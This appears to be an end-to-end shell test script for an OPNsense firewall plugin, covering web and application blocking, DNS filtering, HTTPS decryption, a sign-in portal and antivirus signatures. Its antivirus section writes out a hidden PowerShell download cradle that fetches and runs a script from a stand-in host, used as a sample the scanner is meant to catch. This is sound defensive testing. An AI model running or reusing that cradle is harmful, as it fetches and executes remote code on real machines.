# Sections added in 0.4.0. This file is sourced by e2e.sh (it uses its helpers and counters).

wc_add() { api POST /api/layer7security/webcontrol/addRule "{\"rule\":{\"kind\":\"$1\",\"value\":\"$2\",\"action\":\"$3\"}}" >/dev/null; }
http_code() { cli "curl -sk -m ${2:-8} -o /dev/null -w '%{http_code}' $1 2>/dev/null"; }

if want web; then
echo "== Web Control: wildcards, IP rules, quick actions, live sessions"
clear_policies
clear_web
wc_add domain '*instagram.com' block
wc_add domain '*.reddit.com' block
wc_add domain 'old.reddit.com' allow
wc_add domain '*ikipedia.org' block
wc_add ip '1.1.1.0/24' block
wc_add ip '1.1.1.2' allow
apply
check "*instagram.com blocks the apex name" test "$(dns_status instagram.com)" = NXDOMAIN
check "*instagram.com blocks sub-domains" test "$(dns_status www.instagram.com)" = NXDOMAIN
check "*.reddit.com blocks www.reddit.com" test "$(dns_status www.reddit.com)" = NXDOMAIN
check "an allow rule is an exception inside a blocked site" test "$(dns_status old.reddit.com)" = NOERROR
check "unrelated names still resolve" test "$(dns_status github.com)" = NOERROR
check "a glob that DNS cannot express leaves DNS alone" test "$(dns_status www.wikipedia.org)" = NOERROR
check "the engine blocks that glob on the TLS name" blocked https://www.wikipedia.org
check "cdninstagram.com is caught by the glob in the engine" blocked https://scontent.cdninstagram.com
test_verdict() { api POST /api/layer7security/webcontrol/test "{\"q\":\"$1\"}" | grep -q "\"verdict\":\"$2\""; }
check "test box: www.instagram.com is blocked" test_verdict www.instagram.com block
check "test box: old.reddit.com is allowed" test_verdict old.reddit.com allow
check "test box: github.com has no rule" test_verdict github.com none
code=$(http_code https://1.1.1.1/ 6)
check "IP rule blocks 1.1.1.1 (got $code)" test "$code" = 000
code=$(http_code https://1.1.1.2/ 8)
check "IP allow exception keeps 1.1.1.2 reachable (got $code)" test "$code" != 000
ipb_table() { opn 'pfctl -t l7_ipb_1 -T show' | grep -q '1.1.1.0/24'; }
check "pf table holds the IP rules" ipb_table

echo "-- mistakes that would cut off the network are refused"
r=$(api POST /api/layer7security/webcontrol/quick '{"kind":"ip","value":"10.77.0.1","action":"block"}')
check "an address of the firewall cannot be blocked" sh -c "echo '$r' | grep -q 'firewall itself'"
r=$(api POST /api/layer7security/webcontrol/addRule '{"rule":{"kind":"ip","value":"10.77.0.0/24","action":"block"}}')
check "nor a network that contains it" sh -c "echo '$r' | grep -q '\"result\":\"failed\"'"
r=$(api POST /api/layer7security/webcontrol/addRule '{"rule":{"kind":"domain","value":"com","action":"block"}}')
check "a bare top-level name is refused" sh -c "echo '$r' | grep -q '\"result\":\"failed\"'"
r=$(api POST /api/layer7security/webcontrol/addRule '{"rule":{"kind":"domain","value":"*","action":"block"}}')
check "a lone * (everything) is refused" sh -c "echo '$r' | grep -q '\"result\":\"failed\"'"
echo "-- adding many at once"
bulk=$(api POST /api/layer7security/webcontrol/bulk '{"text":"bulk1.example, *.bulk2.example\nhttps://bulk3.example/page 198.51.100.77 not a name!!","action":"block"}')
check "a pasted list is added (3 websites and 1 address; the words that are no names are refused)" sh -c "echo '$bulk' | grep -q '\"added\":4'"
bulk=$(api POST /api/layer7security/webcontrol/bulk '{"text":"bulk1.example","action":"block"}')
check "entries that exist are skipped" sh -c "echo '$bulk' | grep -q '\"added\":0' && echo '$bulk' | grep -q '\"skipped\":1'"
clear_web
apply
echo "-- quick action with a time limit"
clear_web
apply
q=$(api POST /api/layer7security/webcontrol/quick '{"kind":"domain","value":"github.com","action":"block","minutes":"1","note":"e2e"}')
check "quick block is saved and applied" sh -c "echo '$q' | grep -q '\"applied\":true'"
check "github.com is blocked by the quick rule" blocked https://github.com
echo "  waiting for the rule to run out"
sleep 66
opn "configctl layer7security web-expire" >/dev/null
sleep 8
rules_none() { api GET /api/layer7security/webcontrol/searchRule | grep -q '"total":0'; }
check "the temporary rule is gone from the list" rules_none
check "github.com is reachable again" reaches https://github.com

echo "-- live sessions"
cli '(curl -s --limit-rate 40k -m 70 -o /dev/null https://deb.debian.org/debian/ls-lR.gz >/dev/null 2>&1 &) ; sleep 1'
sleep 7
live_json() { api GET "/api/layer7security/live/sessions?limit=300&q=debian"; }
live_row() { live_json | python -c "
import json,sys
d=json.load(sys.stdin)
r=[x for x in d['rows'] if x['sport']==443 and x['client']=='10.77.0.2' and x['direction']=='out' and x['down']>0 and 'debian' in x['host']]
sys.exit(0 if r else 1)"; }
check "the running download is listed with device, website and bytes" live_row
srv=$(live_json | python -c "
import json,sys
d=json.load(sys.stdin)
r=[x for x in d['rows'] if x['sport']==443 and 'debian' in x['host']]
print(r[0]['server'] if r else '')" | tr -d '\015')
api POST /api/layer7security/webcontrol/quick "{\"kind\":\"ip\",\"value\":\"$srv\",\"action\":\"block\",\"minutes\":\"0\",\"note\":\"e2e live\"}" >/dev/null
sleep 3
live_gone() { ! live_json | python -c "
import json,sys
d=json.load(sys.stdin)
sys.exit(0 if [x for x in d['rows'] if x['server']=='$srv' and x['state'].startswith('ESTABLISHED')] else 1)"; }
check "blocking the address from the live view cuts the open connection ($srv)" live_gone
check "the new connection to it is refused" test "$(http_code https://$srv/ 6)" = 000
clear_web
apply
check "after the rule is removed the website works again" reaches https://deb.debian.org/debian/

fi

if want appctl; then
echo "== Application Control and AI Service quick controls"
clear_policies
clear_web
r=$(api POST /api/layer7security/appcontrol/save '{"categories":"{\"Game\":\"block\",\"VPN\":\"monitor\"}","applications":"{}"}')
check "one-click category rules are saved" sh -c "echo '$r' | grep -q '\"result\":\"saved\"'"
st=$(api GET /api/layer7security/appcontrol/state)
check "state shows Game=block and VPN=monitor" sh -c "echo '$st' | grep -q '\"Game\":\"block\"' && echo '$st' | grep -q '\"VPN\":\"monitor\"'"
rows=$(api GET '/api/layer7security/settings/search_policy?module=app' | jget "len(d['rows'])")
check "the policies appear in the Application Control list ($rows)" test "$rows" = 2
rows=$(api GET '/api/layer7security/settings/search_policy?module=cfs' | jget "len(d['rows'])")
check "and not in the content filter list" test "$rows" = 0
api POST /api/layer7security/appcontrol/save '{"categories":"{\"Game\":\"allow\",\"VPN\":\"allow\"}","applications":"{}"}' >/dev/null
rows=$(api GET /api/layer7security/settings/search_policy | jget "len(d['rows'])")
check "choosing Allow removes the rules" test "$rows" = 0
found=$(api GET '/api/layer7security/appcontrol/searchApps?q=youtube' | jget "len(d['rows'])")
check "the application search finds YouTube ($found)" test "$found" -ge 1
r=$(api POST /api/layer7security/ai/save '{"services":"{\"claude\":{\"action\":\"block\",\"inspect\":false}}"}')
check "an AI service can be blocked with one call" sh -c "echo '$r' | grep -q '\"result\":\"saved\"'"
claude=$(api GET /api/layer7security/ai/state | jget "[s['action'] for s in d['services'] if s['id']=='claude'][0]")
check "AI state shows claude blocked ($claude)" test "$claude" = block
api POST /api/layer7security/ai/save '{"services":"{\"claude\":{\"action\":\"\",\"inspect\":false}}"}' >/dev/null
for u in $(api GET /api/layer7security/settings/search_ai | python -c "import json,sys; [print(r['uuid']) for r in json.load(sys.stdin)['rows']]" | tr -d '\015'); do api POST "/api/layer7security/settings/del_ai/$u" >/dev/null; done

fi

if want cfs; then
echo "== Content filtering: cloud categories, safe search, threat lists"
clear_policies
clear_web
upd=$(api POST /api/layer7security/cfs/update '{}')
check "the cloud server lists download" sh -c "echo '$upd' | grep -q '\"result\":\"ok\"'"
dom=$(opn 'head -1 /var/db/layer7security/lists/botnet.txt' | tr -d '\015')
check "the botnet category has entries (first: $dom)" test -n "$dom"
api POST /api/layer7security/settings/set '{"layer7security":{"general":{"dnsFilter":"1","dnsMode":"nxdomain","dnsCategories":"botnet","dnsBlock":"","dnsAllow":""},"cfs":{"safeSearch":"1","youtube":"strict","threatIps":"c2,drop","threatDirection":"both"}}}' >/dev/null
apply
check "a domain of the botnet category does not resolve" test "$(dns_status $dom)" = NXDOMAIN
look=$(api POST /api/layer7security/cfs/lookup "{\"q\":\"$dom\"}")
check "the category lookup names it" sh -c "echo '$look' | grep -q 'botnet'"
safe_g() { [ "$(cli 'dig +noall +answer @10.77.0.1 www.google.com | grep -c forcesafesearch')" -ge 1 ]; }
safe_y() { [ "$(cli 'dig +noall +answer @10.77.0.1 www.youtube.com | grep -c restrict.youtube')" -ge 1 ]; }
thr_rules() { [ "$(opn 'pfctl -sr' | grep -c l7thr)" -ge 4 ]; }
check "safe search: Google answers with the safe-search name" safe_g
check "YouTube restricted mode answers with the restrict name" safe_y
n=$(opn 'pfctl -t l7_thr_c2 -T show | wc -l' | tr -d '\015 ')
check "the botnet address list is loaded into pf ($n entries)" test "$n" -gt 100
check "block rules exist for the threat lists" thr_rules
sleep 2
log=$(api GET '/api/layer7security/cfs/log?module=cfs&minutes=10&limit=50')
check "the refused lookup is in the activity log" sh -c "echo '$log' | grep -q '$dom'"
api POST /api/layer7security/settings/set '{"layer7security":{"general":{"dnsFilter":"0","dnsCategories":""},"cfs":{"safeSearch":"0","youtube":"off","threatIps":""}}}' >/dev/null
apply
check "turning everything off restores normal lookups" test "$(dns_status $dom)" != NXDOMAIN

fi

if want dpi; then
echo "== DPI-SSL: decrypt all HTTPS except the exclusions"
clear_policies
clear_web
api POST /api/layer7security/audit/ack >/dev/null
api POST /api/layer7security/settings/set '{"layer7security":{"dpi":{"enabled":"1","scope":"all","caMode":"full","sites":"","exclusions":"","excludeDefaults":"1"}}}' >/dev/null
r=$(api POST /api/layer7security/service/reconfigure)
if echo "$r" | grep -q "not allowed to sign"; then
	ok "scope all is refused while the certificate is restricted"
	api POST /api/layer7security/inspection/ca_new >/dev/null
else
	ok "the certificate already fits scope all"
fi
apply
issuer() { cli "echo | openssl s_client -connect $1:443 -servername $1 2>/dev/null | openssl x509 -noout -issuer" | tr -d ''; }
ours() { issuer "$1" | grep -q 'CA (OPNsense'; }
not_ours() { ! ours "$1"; }
check "wikipedia.org is decrypted with the DPI-SSL certificate" ours www.wikipedia.org
check "a site on the default exclusion list keeps its certificate" not_ours www.apple.com
api POST /api/layer7security/settings/set '{"layer7security":{"dpi":{"exclusions":"github.com"}}}' >/dev/null
apply
check "an own exclusion keeps its certificate" not_ours github.com
log=$(api GET '/api/layer7security/inspection/log?rows=100')
check "the session log tells decrypted from passed-through" sh -c "echo '$log' | grep -q '\"mode\": *\"bump\"' && echo '$log' | grep -q '\"mode\": *\"splice\"'"
api POST /api/layer7security/settings/set '{"layer7security":{"dpi":{"enabled":"0","scope":"selected","caMode":"restricted","exclusions":""}}}' >/dev/null
api POST /api/layer7security/inspection/ca_new >/dev/null
apply
check "after switching DPI-SSL off nothing is decrypted" not_ours www.wikipedia.org

fi

if want auth; then
echo "== Sign-in portal"
clear_policies
clear_web
signin() { # user password -> prints the portal's answer
	cat <<EOS | cli 'sh -s'
cd /tmp
curl -sk -c cj -m 8 https://10.77.0.1:8444/login > f.html
T=\$(grep -o 'name="t" value="[0-9a-f]*' f.html | sed 's/.*value="//')
curl -sk -m 20 --data-urlencode "t=\$T" --data-urlencode "user=$1" --data-urlencode "password=$2" -d "next=" https://10.77.0.1:8444/login
EOS
}
api POST /api/layer7security/settings/set '{"layer7security":{"auth":{"enabled":"1","interfaces":"lan","server":"Local Database","groups":"","bypass":"","sessionHours":"8","idleMinutes":"120"}}}' >/dev/null
apply
api POST /api/layer7security/access/logoutAll '{}' >/dev/null
sleep 2
portal_up() { opn 'sockstat -l' | grep -q ':8444'; }
check "the portal is running" portal_up
loc=$(cli "curl -s -m 8 -D - -o /dev/null http://example.com/page?x=1 | tr -d '\015' | grep -i '^location:'")
check "plain HTTP from a device that is not signed in is sent to the login page ($loc)" sh -c "echo '$loc' | grep -q 'https://10.77.0.1:8444/login?next='"
check "HTTPS is blocked until the device signs in" test "$(http_code https://www.wikipedia.org 6)" = 000
check "DNS keeps working" test "$(dns_status github.com)" = NOERROR
out=$(signin root wrong-password)
check "a wrong password is refused" sh -c "echo '$out' | grep -q 'Wrong user name or password'"
out=$(signin root opnsense)
check "the right password signs in" sh -c "echo '$out' | grep -q 'Signed in as'"
check "HTTPS works after signing in" reaches https://www.wikipedia.org
sess=$(api GET /api/layer7security/access/sessions)
check "the session list shows root on 10.77.0.2" sh -c "echo '$sess' | grep -q '\"user\": *\"root\"' && echo '$sess' | grep -q '10.77.0.2'"
echo "-- policy for a signed-in user"
api POST /api/layer7security/settings/add_user '{"user":{"name":"root","addresses":"","description":"signed-in account"}}' >/dev/null
uid=$(api GET /api/layer7security/settings/search_user | jget "d['rows'][0]['uuid']")
add_policy "{\"policy\":{\"enabled\":\"1\",\"name\":\"t-signin\",\"sequence\":\"10\",\"action\":\"block\",\"users\":\"$uid\",\"applications\":\"YouTube\",$ALLDAYS}}"
apply
sleep 3
check "YouTube is blocked for the signed-in user" blocked https://www.youtube.com
check "other sites work for the signed-in user" reaches https://www.wikipedia.org
echo "-- sign out"
api POST /api/layer7security/access/logout '{"ip":"10.77.0.2"}' >/dev/null
sleep 2
check "after the session is ended HTTPS is blocked again" test "$(http_code https://www.wikipedia.org 6)" = 000
log=$(api GET '/api/layer7security/access/log?rows=20')
check "the sign-in log has the events" sh -c "echo '$log' | grep -q 'login' && echo '$log' | grep -q 'fail' && echo '$log' | grep -q 'admin-logout'"
echo "-- devices that never need to sign in"
api POST /api/layer7security/settings/set '{"layer7security":{"auth":{"bypass":"10.77.0.2"}}}' >/dev/null
apply
check "a device on the bypass list browses without signing in" reaches https://www.wikipedia.org
echo "-- off again"
api POST /api/layer7security/settings/set '{"layer7security":{"auth":{"enabled":"0","bypass":""}}}' >/dev/null
clear_policies
apply
portal_down() { ! opn 'sockstat -l' | grep -q ':8444'; }
check "with sign-in off the portal is stopped" portal_down
check "and browsing works without signing in" reaches https://www.wikipedia.org

fi

if want sig; then
echo "== Antivirus signatures and hash types"
clear_policies
api POST /api/layer7security/audit/ack >/dev/null
sg=$(opn '/usr/local/opnsense/scripts/OPNsense/Layer7Security/signatures.py status')
check "signature rules are installed ($sg)" sh -c "echo '$sg' | grep -q '\"ready\": true'"
opnsh <<'EOF'
mkdir -p /tmp/avsrv
printf 'powershell -nop -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\"http://x.example/a.ps1\")"\n' > /tmp/avsrv/cradle.txt
printf 'just some text for the md5 test %s\n' "$(date +%s)" > /tmp/avsrv/md5.txt
printf 'plain file\n' > /tmp/avsrv/clean.txt
pkill -f "http.server 80 --bind 198.51.100.10" 2>/dev/null
ifconfig lo0 alias 198.51.100.10/32 2>/dev/null
cd /tmp/avsrv && daemon -f -p /var/run/avtest.pid python3 -m http.server 80 --bind 198.51.100.10
sleep 1
EOF
sigset() { api POST /api/layer7security/settings/set "{\"layer7security\":{\"av\":$1}}" >/dev/null; }
sigget() { cli "curl -sS -m 10 -o /tmp/av.out -w '%{http_code}' http://198.51.100.10/$1 2>/dev/null"; }
sigset '{"enabled":"1","scanHttp":"1","httpsDomains":"","hashAction":"block","yaraAction":"monitor","useCloud":"1","executableAction":"off","scriptAction":"off","packageAction":"off","archiveAction":"off","customHashes":"","feedUrl":"","maxSizeMb":"50","failMode":"open"}'
apply; sleep 2
check "a clean file is delivered" test "$(sigget clean.txt)" = 200
check "a file that matches a signature is delivered in monitor mode" test "$(sigget cradle.txt)" = 200
sigset '{"yaraAction":"block"}'
apply; sleep 2
check "the same file is blocked in block mode" test "$(sigget cradle.txt)" = 403
reason() { cli 'grep -c "virus signature L7_PowerShell" /tmp/av.out' | grep -q 1; }
check "the block page names the signature" reason
det=$(api POST /api/layer7security/antivirus/search '{"current":1,"rowCount":20,"searchPhrase":"signature","period":3600}')
check "the detection is listed" sh -c "echo '$det' | grep -q 'L7_PowerShell_Download_Cradle'"
check "a clean file is still delivered in block mode" test "$(sigget clean.txt)" = 200
md5=$(opn 'md5 -q /tmp/avsrv/md5.txt' | tr -d '\015')
sigset "{\"yaraAction\":\"off\",\"customHashes\":\"$md5\"}"
apply; sleep 2
check "a file is blocked by its MD5 ($md5)" test "$(sigget md5.txt)" = 403
chk=$(api POST /api/layer7security/antivirus/check "{\"hash\":\"$md5\"}")
check "the hash lookup accepts an MD5" sh -c "echo '$chk' | grep -q '\"known\":true'"
mdh=$(opn 'sed -n 5p /var/db/layer7security/av/cloud_md5.txt' | tr -d '\015' | cut -d';' -f1)
chk=$(api POST /api/layer7security/antivirus/check "{\"hash\":\"$mdh\"}")
check "a hash from the cloud list is known ($mdh)" sh -c "echo '$chk' | grep -q '\"known\":true'"
sigset '{"enabled":"0","yaraAction":"monitor","customHashes":""}'
apply
opnsh <<'EOF'
pkill -f "http.server 80 --bind 198.51.100.10"
ifconfig lo0 -alias 198.51.100.10 2>/dev/null
rm -rf /tmp/avsrv /var/run/avtest.pid
EOF

fi

